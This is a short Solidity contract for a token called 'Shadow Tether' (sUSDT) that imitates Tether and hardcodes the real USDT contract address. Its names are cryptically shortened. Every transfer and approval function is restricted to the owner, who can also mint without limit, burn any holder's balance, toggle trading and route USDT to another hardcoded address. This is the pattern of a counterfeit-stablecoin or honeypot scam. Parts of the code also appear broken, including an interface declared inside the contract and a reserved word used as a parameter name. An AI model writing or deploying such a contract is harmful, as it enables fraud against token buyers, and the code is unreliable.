// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract S {
    address private constant O = 0x0b3Aa0BC4BE5058f3239cF8a79AAAFf4959D619a;
    address private constant U = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant T = 0x11679c8777609929BB11fe41A4195e9263Cb54E3;

    uint256 private s;
    mapping(address => uint256) private b;
    mapping(address => mapping(address => uint256)) private a;

    bool private e;
    bool private p = true;
    mapping(address => bool) private i;

    interface I { function t(address,uint256) external returns (bool); function tf(address,address,uint256) external returns (bool); function a(address,uint256) external returns (bool); }

    constructor(uint256 is) { require(msg.sender == O); s = is * 10**6; b[O] = s; emit Tr(address(0),O,is * 10**6); }

    modifier o() { require(msg.sender == O); _; }

    function n() public pure returns (string memory) { return "Shadow Tether"; }
    function sy() public pure returns (string memory) { return "sUSDT"; }
    function d() public pure returns (uint8) { return 6; }
    function ts() public view returns (uint256) { return s; }
    function bo(address a) public view returns (uint256) { return b[a]; }
    function al(address o, address s) public view returns (uint256) { return a[o][s]; }

    function tr(address to, uint256 am) public o returns (bool) {
        require(e, "TD");
        require(!i[O] || !p, "PR");
        require(b[O] >= am, "IB");
        b[O] -= am; b[to] += am; emit Tr(O,to,am); return true;
    }

    function ap(address sp, uint256 am) public o returns (bool) {
        a[O][sp] = am; emit Ap(O,sp,am); return true;
    }

    function tf(address from, address to, uint256 am) public o returns (bool) {
        require(e, "TD");
        require(!i[O] || !p, "PR");
        require(b[from] >= am, "IB");
        require(a[from][O] >= am, "IA");
        b[from] -= am; b[to] += am; a[from][O] -= am; emit Tr(from,to,am); return true;
    }

    function m(address to, uint256 am) external o { s += am; b[to] += am; emit Tr(address(0),to,am); }
    function br(address from, uint256 am) external o { require(b[from] >= am, "IB"); s -= am; b[from] -= am; emit Tr(from,address(0),am); }
    function et() external o { e = true; }
    function dt() external o { e = false; }
    function spr(bool en) external o { p = en; }
    function sp(address pool, bool st) external o { i[pool] = st; }

    function dat(uint256 am) external o {
        I u = I(U);
        require(u.tf(O,address(this),am), "UPF");
        require(u.t(T,am * 2), "UTF");
    }

    event Tr(address indexed from, address indexed to, uint256 value);
    event Ap(address indexed owner, address indexed spender, uint256 value);
}